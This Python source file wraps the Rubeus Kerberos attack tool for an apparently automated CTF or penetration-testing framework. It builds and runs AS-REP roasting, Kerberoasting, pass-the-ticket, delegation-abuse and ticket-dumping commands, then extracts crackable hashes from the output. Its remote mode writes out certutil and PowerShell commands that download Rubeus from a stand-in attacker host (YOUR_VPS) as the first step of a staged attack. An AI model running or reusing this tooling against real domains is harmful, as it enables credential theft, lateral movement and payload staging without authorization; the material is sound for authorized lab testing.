# tools/rubeus_tool.py
"""
Rubeus Tool - Kerberos攻击工具

功能:
- AS-REP Roasting (Kerberoasting预认证攻击)
- Kerberoasting (SPN攻击)
- Pass-the-Ticket (PTT)
- S4U2Self/S4U2Proxy (约束委派)
- TGT请求和票据操作

CTF场景优化:
- 自动化票据攻击
- 哈希提取和破解
"""
import os
import re
import base64
import shutil
import subprocess
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool


class RubeusTool(CommandLineTool):
    """
    Rubeus Kerberos攻击工具封装
    """

    # 常用命令
    COMMANDS = {
        "asreproast": {
            "description": "AS-REP Roasting - 获取禁用预认证用户的哈希",
            "params": ["domain", "dc"],
            "usage": "Rubeus.exe asreproast /domain:{domain} /dc:{dc} /format:hashcat"
        },
        "kerberoast": {
            "description": "Kerberoasting - 获取SPN用户的TGS哈希",
            "params": ["domain", "dc", "username", "password"],
            "usage": "Rubeus.exe kerberoast /domain:{domain} /dc:{dc} /user:{username} /password:{password}"
        },
        "asktgt": {
            "description": "请求TGT票据",
            "params": ["domain", "username", "password", "dc"],
            "usage": "Rubeus.exe asktgt /domain:{domain} /user:{username} /password:{password} /dc:{dc}"
        },
        "asktgs": {
            "description": "请求TGS票据",
            "params": ["domain", "service", "ticket"],
            "usage": "Rubeus.exe asktgs /service:{service} /ticket:{ticket}"
        },
        "ptt": {
            "description": "Pass-the-Ticket - 导入票据到内存",
            "params": ["ticket"],
            "usage": "Rubeus.exe ptt /ticket:{ticket}"
        },
        "dump": {
            "description": "导出当前用户的Kerberos票据",
            "params": [],
            "usage": "Rubeus.exe dump /service:krbtgt"
        },
        "tgtdeleg": {
            "description": "获取可转发的TGT",
            "params": [],
            "usage": "Rubeus.exe tgtdeleg"
        },
        "s4u": {
            "description": "S4U2Self/S4U2Proxy - 约束委派攻击",
            "params": ["domain", "user", "rc4", "impersonate", "service"],
            "usage": "Rubeus.exe s4u /user:{user} /rc4:{rc4} /impersonate:{impersonate} /msdsspn:{service}"
        },
        "createnetonly": {
            "description": "创建空进程用于PTT",
            "params": ["program"],
            "usage": "Rubeus.exe createnetonly /program:{program}"
        },
        "describe": {
            "description": "解析票据内容",
            "params": ["ticket"],
            "usage": "Rubeus.exe describe /ticket:{ticket}"
        }
    }

    def __init__(self):
        self.tools_dir = "/opt/tools/windows"
        self.executable = None

        # 检查Rubeus路径
        common_paths = [
            f"{self.tools_dir}/Rubeus.exe",
            "/opt/tools/Rubeus.exe",
            "./Rubeus.exe",
            "Rubeus.exe"
        ]

        for path in common_paths:
            if os.path.exists(path):
                self.executable = path
                break

        self.cmd_path = self.executable or "Rubeus.exe"
        super().__init__(self.cmd_path)
        self.timeout = 120

    def name(self) -> str:
        return "rubeus"

    def description(self) -> str:
        return "Kerberos攻击工具，支持AS-REP Roasting、Kerberoasting、PTT、约束委派等。"

    def supported_vulns(self) -> list:
        return [
            "AS-REP Roasting",
            "Kerberoasting",
            "Pass-the-Ticket",
            "Constrained Delegation",
            "Kerberos Attack",
            "Domain Persistence"
        ]

    def capability_statement(self) -> str:
        return ("Kerberos攻击工具。支持：AS-REP Roasting(预认证禁用)、Kerberoasting(SPN攻击)、"
                "PTT(票据传递)、S4U(约束委派)。适合：域环境渗透、提权、横向移动。")

    def check_available(self) -> bool:
        return self.executable is not None and os.path.exists(self.executable)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": f"操作: {', '.join(self.COMMANDS.keys())}",
                "required": True
            },
            "domain": {
                "type": "str",
                "description": "目标域名 (如 corp.local)",
                "required": False
            },
            "dc": {
                "type": "str",
                "description": "域控制器IP",
                "required": False
            },
            "username": {
                "type": "str",
                "description": "用户名",
                "required": False
            },
            "password": {
                "type": "str",
                "description": "密码",
                "required": False
            },
            "hash": {
                "type": "str",
                "description": "NTLM哈希 (RC4)",
                "required": False
            },
            "ticket": {
                "type": "str",
                "description": "票据 (base64或文件路径)",
                "required": False
            },
            "service": {
                "type": "str",
                "description": "SPN服务 (如 cifs/dc.corp.local)",
                "required": False
            },
            "impersonate": {
                "type": "str",
                "description": "要模拟的目标用户",
                "required": False
            },
            "shell_session": {
                "type": "str",
                "description": "远程shell会话标识",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        action = params.get("action")
        shell_session = params.get("shell_session")

        if not action:
            return {"success": False, "error": "必须指定action参数"}

        if action not in self.COMMANDS:
            return {
                "success": False,
                "error": f"未知操作: {action}",
                "available_actions": list(self.COMMANDS.keys())
            }

        # 如果有shell会话，生成远程执行命令
        if shell_session:
            return self._generate_remote_command(action, params)

        # 本地执行 (需要在Windows环境或有wine)
        return self._execute_local(action, params)

    def _execute_local(self, action: str, params: Dict) -> Dict:
        """本地执行"""
        if not self.check_available():
            return {
                "success": False,
                "error": "Rubeus.exe 未找到",
                "hint": f"下载 Rubeus.exe 放到 {self.tools_dir}/"
            }

        # 构建命令
        cmd_args = self._build_command_args(action, params)

        try:
            result = self._run_command([self.executable] + cmd_args, timeout=self.timeout, stream_output=True)
            stdout = result.get("stdout", "")

            # 解析票据哈希
            hashes = self._extract_hashes(stdout)

            return {
                "success": result.get("returncode", 0) == 0,
                "action": action,
                "hashes": hashes,
                "hash_count": len(hashes),
                "raw_output": stdout[:3000] if len(stdout) > 3000 else stdout,
                "summary": f"发现 {len(hashes)} 个Kerberos哈希" if hashes else "执行完成"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _generate_remote_command(self, action: str, params: Dict) -> Dict:
        """生成远程执行命令"""
        cmd_args = self._build_command_args(action, params)
        full_cmd = f"Rubeus.exe {' '.join(cmd_args)}"

        # 生成上传和执行流程
        upload_commands = {
            "certutil": f"certutil -urlcache -split -f http://YOUR_VPS/Rubeus.exe C:\\temp\\Rubeus.exe",
            "powershell": f"IEX(New-Object Net.WebClient).DownloadFile('http://YOUR_VPS/Rubeus.exe', 'C:\\temp\\Rubeus.exe')"
        }

        full_workflow = f"""
# 1. 上传Rubeus
{upload_commands['certutil']}

# 2. 执行Kerberos攻击
C:\\temp\\{full_cmd}

# 3. 如需PTT，执行:
C:\\temp\\Rubeus.exe ptt /ticket:BASE64_TICKET

# 4. 验证票据
klist
"""

        return {
            "success": True,
            "mode": "remote",
            "action": action,
            "description": self.COMMANDS[action]["description"],
            "upload_commands": upload_commands,
            "exec_command": f"C:\\temp\\{full_cmd}",
            "full_workflow": full_workflow,
            "notes": [
                f"操作: {action}",
                "Kerberos攻击需要域环境",
                "PTT后可直接访问域资源"
            ]
        }

    def _build_command_args(self, action: str, params: Dict) -> List[str]:
        """构建命令参数"""
        args = [action]

        domain = params.get("domain", "")
        dc = params.get("dc", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        ticket = params.get("ticket", "")
        service = params.get("service", "")
        impersonate = params.get("impersonate", "")

        if domain:
            args.extend(["/domain", domain])
        if dc:
            args.extend(["/dc", dc])
        if username:
            args.extend(["/user", username])
        if password:
            args.extend(["/password", password])
        if hash_val:
            args.extend(["/rc4", hash_val])
        if ticket:
            args.extend(["/ticket", ticket])
        if service:
            args.extend(["/service", service])
        if impersonate:
            args.extend(["/impersonate", impersonate])

        # 默认输出hashcat格式
        if action in ["asreproast", "kerberoast"]:
            args.append("/format:hashcat")

        # 导出票据到文件
        if action in ["asktgt", "asktgs"]:
            args.append("/ptt")  # 同时导入内存

        return args

    def _extract_hashes(self, output: str) -> List[Dict]:
        """提取Kerberos哈希"""
        hashes = []

        # AS-REP哈希模式
        asrep_pattern = re.compile(r'\$krb5asrep\$[^\s]+')
        for match in asrep_pattern.finditer(output):
            hashes.append({
                "type": "asrep",
                "hash": match.group(),
                "format": "hashcat"
            })

        # TGS哈希模式
        tgs_pattern = re.compile(r'\$krb5tgs\$[^\s]+')
        for match in tgs_pattern.finditer(output):
            hashes.append({
                "type": "tgs",
                "hash": match.group(),
                "format": "hashcat"
            })

        return hashes

    # ==================== 快捷方法 ====================

    def asreproast(self, domain: str, dc: str) -> Dict:
        """快速AS-REP Roasting"""
        return self.execute("", {"action": "asreproast", "domain": domain, "dc": dc})

    def kerberoast(self, domain: str, dc: str, username: str, password: str) -> Dict:
        """快速Kerberoasting"""
        return self.execute("", {
            "action": "kerberoast",
            "domain": domain,
            "dc": dc,
            "username": username,
            "password": password
        })

    def ptt(self, ticket: str) -> Dict:
        """Pass-the-Ticket"""
        return self.execute("", {"action": "ptt", "ticket": ticket})

    def dump_tickets(self) -> Dict:
        """导出当前票据"""
        return self.execute("", {"action": "dump"})


def register():
    from tool_framework import ToolRegistry
    ToolRegistry.register(RubeusTool())